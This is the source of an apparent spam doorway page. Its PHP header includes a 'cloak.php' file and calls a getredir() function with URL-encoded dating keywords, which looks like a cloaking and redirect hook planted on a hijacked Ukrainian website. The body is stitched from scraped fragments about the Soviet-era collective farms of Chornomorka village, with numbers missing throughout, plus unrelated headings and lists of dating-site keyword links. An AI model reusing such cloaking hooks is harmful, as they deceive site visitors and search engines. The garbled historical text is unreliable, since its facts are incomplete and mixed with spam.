<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%b0%d1%85%d1%96%d0%b4%d0%bd%d0%b8%d0%b9+%d0%bf%d1%96%d0%b4%d0%ba%d0%bb%d1%8e%d1%87%d0%b8%d1%82%d0%b8+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%91%d0%b0%d1%88%d1%82%d0%b0%d0%bd%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Історія села Чорноморка</title>
	<meta name="description" content="За 2 кілометри від міста розташована залізнична зупинка «Баштанка». майор Збройних сил України, учасник російсько-української війни. Довженко." />
	<link rel="canonical" href="https://masage.od.ua/img/106/gah-zahdniy-pdklyuchiti.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/494/lufot-pdklyuchennya-v.php">підключення в Камінь-Каширський Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/247/tofok-servs-znayomstv-v.php">сервіс знайомств в Баранівка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/291/ker-naykrashiy-trener-znayomstv.php">найкращий тренер знайомств Хуст Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/291/cetu-ogoloshennya-pro-znayomstva.php">оголошення про знайомства Кременчук Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/249/keg-skanuvannya-privatnih.php">сканування приватних знайомств в Скадовськ Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Західний підключити поблизу Баштанка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Збитки, заподіяні під час тимчасової нацистської окупації колгоспу становили крб. Колгосп ім. Сталіна с. Бейкуш організований р. До складу колгоспу входило господарств, членів колгоспу. Всього землі у колгоспі було га, з них пашні — га, сінокосу — 80 га, іншої — га. Посівна площа на р. Колгосп мав 24 будинки та господарських будівель, 2 автомашини та велику кількість сільськогосподарського інвентаря, велике стадо рогатої худоби: корів — 76 голів, биків — 3, молодняк — 68 голів; овець: вівцематок — голови, ягнят — 76, баранів —8.</p>
<p>Коней у господарстві налічувалося більше ста голів: кобил — 48, жеребців — 3, меренів — 36, молодняка — Колгосп «Червоний Сніп» с. Малий Бейкуш організований р. До складу входили господарства членів колгоспу. Всього землі у колгоспі було га, з них пашні — га, сінокосу — 4 га, іншої — га. На території колгоспу знаходилися червоний куток, дитячі ясла, конюшні, свинарники, вівчарні, телятники, зерносховища, авто гаражі, вітряний млин.</p>
<p>Ворошилова с. Великий Бейкуш організований р.</p><strong><a id='s1'></a><h2>Заява про внесення змін до дозволу – ДАБІ</h2></strong><p>До складу колгоспу входили 65 господарств, членів колгоспу. Всього землі в колгоспі було га, з них пашні — , іншої — 36 га. Посівна площа на рік складала га, у тому числі озимої пшениці — га, жита — 20 га, ярової пшениці — 0,5 га, ячменю — 60 га, кукурудзи — 12 га, капусти — 0,5 га, буряку кормового — 5 га, люцерни — 24 га, винограднику-8,5 га. Колгосп мав 27 будинків, 1 автомашину та сільськогосподарський інвентар, крупного рогатого скота голів, коней — 67, свиней — 45, овець —  Калініна Бейкушської сільради організований р.</p>
		
	<p>До складу входило 70 господарств, членів колгоспу. Всього землі було га, з них пашні — ,8 га, іншої — 73,2 га. Посівна площа на рік складала га, у тому числі озимої пшениці — га, жита — 25 га, ячменю — 75 га, вівса — 6 га, проса — 12 га, кукурудзи — 12 га, картоплі — 6 га, баштан — 5 га, городніх рослин — 2 га, бавовни — 80 га.</p>
<p>Колгосп мав 16 будівель, крупного рогатого скота — 93 голови, та молодняка — 95 голів, коней — 83, свиней — 54 та молодняка — , овець —  Усі колгоспи обслуговувала Парутинська МТС. У липні — серпні р. Худоба була захоплена нацистської армією. Територія с. Бейкуш була окупована нацистськими військами 20 серпня року. За період окупації на примусові роботи було вивезено 55 осіб. Село звільнено військами Червоної Армії 28 березня року.</p>
<p>У період окупації на території села з 15листопада р. У році колгоспи відновили свою діяльність. Сталіна — крб. Ворошилова — крб. Калініна — крб.</p><a id='s2'></a><h3>Маршруты и расстояния от Баштанки до Одессы</h3><p>Сталіна , Крамаренко Андрій Парфентійович ім. Ворошилова , Вакар Іван Григорович ім. На території сільради окрім зазначених колгоспів діяв також риболовецький колгосп «Червона Україна». На 1 січня р. Ворошилова: чоловіків віком від 16 до 60 років — 16, жінок віком від 16 до 55 років — 71 та підлітків віком від 12 до 16 років — 15, кількість трудоднів, на які розподілялися доходи колгоспників становила — всього наявного населення — особи ; колгосп ім. Калініна: чоловіків — 11, жінок — 54, підлітків — 10; кількість трудоднів — всього наявного населення — особи ; колгосп ім.</p>
<p>Сталіна: чоловіків — 20, жінок — 91, підлітків — 44; кількість трудоднів — всього наявного населення — особи ; колгосп «Червоний сніп»: чоловіків — 39, жінок — , підлітків — 37; кількість трудоднів — всього наявного населення — особи ; риболовецький колгосп «Червона Україна»: чоловіків — 55,жінок — 87, підлітків — 30; господарств — 55 всього наявного населення — осіб ; у році рибаками цього колгоспу було виловлено: оселедця — 30,4 центнерів, тюльки —,51 ц.</p>
<p>За сміливість і відвагу на фронті багато наших земляків нагороджено орденами і медалями: Тимченко Юхим Юхимович — орденом Бойового Червоного Прапора, орденом Слави ступеня. Чорний Кирило Євдокимович — орденом Червоного Прапора. Гайдук Леонід Євменович — орденом Червоної Зірки. Форманюк Яким Якимович — орденом Червоної Зірки. Зойтов Андрій Саурович —орденом Слави ступеня. Павленко Микола Петрович — орденом Слави ступеня. Чудний Максим Микитович — орденом Слави ступеня. Крамаренко Никифор Григорович — орденом Червоної Зірки. Поповенко Ілля Федосійович — орденом Червоної Зірки.</p>
		
			
				<div>баштанка</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/sUPFAODEvVk' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>За зразкову весняно-польову роботу р. Ворошилова —Крамаренко А. Калініна — Вакар І. На 1січня року по колгоспам нараховувалося працездатних: колгосп ім. Ворошилова: чоловіків — 20, жінок — 65, підлітків — 31; кількість трудоднів — ; колгосп ім. Калініна: чоловіків — 16, жінок —41, підлітків — 9; всього трудоднів — ; колгосп «Червоний сніп»: чоловіків — 44, жінок — , підлітків — 15; кількість трудоднів — всього наявного населення — особи.</p>
<p>Відповідно до Державного акту на вічне користування землею р. Сталіна закріплялося ,9 га земельної ділянки, у тому числі: всього громадської землі у колгоспі — ,2 га, польової ріллі — ,6 га, вигідно-пасовищної — ,9 га, городньої — 6 га, під садами — 0,95 га, під виноградниками — 5 га, під громадськими будовами і дворами — 8,14 га, під полезахисними лісосмугами — 2,32 га, під шляхами, вулицями, провулками, громадськими площами — 1,66га, решта земель, що не використовувалися у сільському господарстві — 30,63 га, понад те-присадибний земельний фонд для нових колгоспних дворів — 3,22 га.</p>
<p>Згідно з актами вручення медалей «За доблесну працю у Великій Вітчизняній війні рр. Сталіна: Адамчук Я. Гречка Є. Ворошилова: Козловський У. Калініна: Вакар А. Малий Бейкуш перейменовано у с. Малочорноморка, с.</p>
		
			<br><ul>
			
				<li>послуга знайомств мільйонерів в Конотоп Україна!</li>
			
				<li>знайомства свахи поблизу Старобільськ Україна.</li>
			
				<li>online послуги.</li>
			
				<li>Новини району.</li>
			
				<li>кращі програми підключення в Хмельницький Україна.</li>
			
				<li>місто знайомства поблизу Сторожинець Україна!</li>
			
				<li>зв’язки знайомства Яворів Україна;</li>
			
			</ul>
		
	<p>Великий Бейкуш — у с. Чорноморка, Бейкушівську сільську Раду перейменовано у Чорноморську сільську Раду. На рік у складі Чорноморської сільської Ради були два населені пункти: с. Чорноморка та с. У січні р.</p><img src="http://bashtanskaotg.gov.ua/storage/news/article/dac973fbd7e202712098762a2a09ee50.JPG" alt="Навігаційне меню" style="max-width: 480px; max-height: 480px;"/><p>Бюджет сільради на рік склав 55 тисяч карбованців; на перший квартал р. При колгоспі ім. Сталіна було організовано дитячі ясла, завідувачем призначено Дудніченко Ніну Федорівну, укомплектували штат з кухарки та няньок. У — навчальному році у школах селах Чорноморка та Малочорноморка навчалось учнів директор школи Николенко Ю. У році в Чорноморській семилітній школі навчалось учні директор школи Бриберган , у Малочорноморський початковій школі — 53 учні завідуючий Шабадаш , у початковій школі на косі — 42 учні завідуючий Кабакова.</p>
<p>В семирічній школі було створено фонд загального навчання на суму крб. Завідувачем сільським клубом р. При клубі діяли гуртки: драматичний, хоровий, музичний, оформлювалась молодіжна стінгазета «Комсомолець».</p>
		
			<br><ul>
			
				<li>Історія села Чорноморка – Чорноморська об’єднана територіальна громада.</li>
			
				<li>Расстояние Баштанка Одесса на машине?</li>
			
				<li>найкращий тренер знайомств Ужгород Україна;</li>
			
				<li>Перенаправлення тут:.</li>
			
				<li>Список підприємств, організацій, установ м. Баштанки — Баштанка;</li>
			
				<li>Список підприємств, організацій, установ м. Баштанки.</li>
			
				<li>оголошення про знайомства в Львів Україна;</li>
			
			</ul>
		
	<p>Лише у му кварталі р. Любителі шахів влаштовували у клубі внутріколгоспні турніри, а також зустрічалися з шахістами інших сіл. В р. Згідно з наказом Миколаївського обласного управління сільського господарства від 9 серпня р. Калініна, ім. Ворошилова, ім.</p><strong><a id='s3'></a><h2>2 600+ оголошень про терміновий продаж авто в Львівській області</h2></strong><p>Сталіна голова колгоспу Шевченко С. В Чорноморський семирічній школі директором був Бей О. Г, за високі надої молока була занесена на району Дошку пошани , Хартонюк Є. На серпень р. У рік колгосп ім. Осетрівка Очаківського району і отримав назву колгосп ім. Щороку, за традицією, 16 вересня баштанчани відзначають День міста Баштанка. Спортивний майданчик став вагомим подарунком для наших юних спортсменів, які давно вже мріяли про такий майданчик. Дуже приємно, що наша громада вкладає інвестиції у розвиток таланту та спорту, адже у дітях майбутнє країни.</p><strong><a id='s4'></a><h2>Всі новини</h2></strong><p>Участь в урочистостях взяло керівництво та громадськість міста. З третього по шістнадцяте серпня Ви маєте змогу вплинути на результати голосування. Якщо ти не байдужий до життя своєї громади, бачиш проблеми та шляхи їх вирішення, мрієш озеленити район чи облаштувати велосипедну доріжку, не хочеш чекати змін, а готовий створювати їх самостійно, тоді Бюджет участі це те, що тобі потрібно. Піщани вшанували учасників Другої світової війни. Можливість проголосувати з'явиться за два тижні, після офіційного завершення карантину.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/377/kuhoc-naykrash-dodatki-dlya.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/106/hydis-sayti-znayomstv-u.php">сайти знайомств у місті Керч Україна</a></li><li><a href="https://masage.od.ua/img/196/pytex-sayti-znayomstv-dlya.php">сайти знайомств для міста в Дубно Україна</a></li><li><a href="https://masage.od.ua/img/280/jol-poshuk-vikonavchih-znayomstv.php">пошук виконавчих знайомств Тальне Україна</a></li><li><a href="https://masage.od.ua/img/494/nu-shvidksn-pobachennya.php">швидкісні побачення більше 40 Сніжне Україна</a></li><li><a href="https://masage.od.ua/img/291/fe-cholovki-znayomstva.php">чоловіки знайомства в Чернігів Україна</a></li><li><a href="https://masage.od.ua/img/133/roc-naykrashe-mstse.php">найкраще місце підключити в Рахів Україна</a></li><li><a href="https://masage.od.ua/img/106/fenyb-sayti-znayomstv.php">сайти знайомств чоловіки Новий Розділ Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#s1'>Заява про внесення змін до дозволу – ДАБІ</a></li>
<li><a href='#s2'>Маршруты и расстояния от Баштанки до Одессы</a></li>
<li><a href='#s3'>2 600+ оголошень про терміновий продаж авто в Львівській області</a></li>
<li><a href='#s4'>Всі новини</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/377/kuwi-dodatok-dlya-znayomstv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>